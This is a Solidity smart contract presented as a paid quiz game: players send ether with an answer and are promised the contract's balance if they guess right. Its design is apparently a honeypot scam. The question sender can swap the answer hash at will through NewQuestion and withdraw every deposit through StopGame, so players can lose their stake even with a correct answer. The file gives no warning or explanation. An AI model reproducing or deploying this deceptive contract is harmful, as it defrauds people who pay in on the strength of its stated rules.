1 pragma solidity ^0.4.25;
2 
3 contract MathTest
4 {
5     function Try(string _response) external payable {
6         require(msg.sender == tx.origin);
7         
8         if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value>minBet)
9         {
10             msg.sender.transfer(address(this).balance);
11         }
12     }
13 
14     string public question;
15     uint256 public minBet = count * 2 * 10 finney;
16     
17     address questionSender;
18     
19     bytes32 responseHash;
20  
21     uint count;
22     
23     function start_quiz_game(string _question,bytes32 _response, uint _count) public payable {
24         if(responseHash==0x0) 
25         {
26             responseHash = _response;
27             question = _question;
28             count = _count;
29             questionSender = msg.sender;
30         }
31     }
32     
33     function StopGame() public payable onlyQuestionSender {
34        msg.sender.transfer(address(this).balance);
35     }
36     
37     function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
38         question = _question;
39         responseHash = _responseHash;
40     }
41     
42     function newQuestioner(address newAddress) public onlyQuestionSender{
43         questionSender = newAddress;
44     }
45     
46     modifier onlyQuestionSender(){
47         require(msg.sender==questionSender);
48         _;
49     }
50     
51     function() public payable{}
52 }